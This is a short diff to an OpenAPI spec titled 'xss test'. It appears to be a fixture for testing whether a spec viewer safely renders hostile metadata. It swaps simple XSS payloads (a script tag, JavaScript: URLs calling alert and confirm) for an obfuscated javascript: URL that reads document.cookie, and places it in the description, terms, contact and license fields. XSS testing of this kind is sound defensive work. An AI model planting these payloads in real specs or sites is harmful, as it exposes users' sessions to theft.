@@ -1,14 +1,14 @@
 openapi: 3.3.1
 info:
   title: "xss test"
-  description: "'>+<script>alert(1)</script>"
-  termsOfService: "JavaScript://%250Dtop.confirm?.(1)//"
+  description: "javascript:Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))"
+  termsOfService: "javascript:Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))"
   contact:
     name: "xss test"
     email: "xss test"
-    url: "javascript:alert(document.domain)"
+    url: "javascript:Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))"
   license:
     name: "xss test"
-    url: "JavaScript://%250Dtop.confirm?.(1)//"
+    url: "javascript:Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))"
   version: "1.0"
 paths: {}
